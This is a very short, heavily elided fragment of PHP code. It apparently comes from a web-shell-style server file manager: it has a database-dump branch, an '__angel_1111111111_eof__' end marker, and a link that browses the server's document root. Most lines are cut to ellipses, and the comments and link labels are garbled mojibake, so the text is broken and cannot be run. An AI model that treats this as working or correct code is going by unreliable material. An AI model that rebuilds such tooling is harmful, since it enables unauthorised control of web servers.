	...
	if (!$dbname) {
		...
		if (!file_exists($mysqldlfile)) {
			...
			if(!$result){
				...
				//ʱʾض,ֶȡ__angel_1111111111_eof__ļʱ
...
<?php
	...
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">վĿ¼</a>');
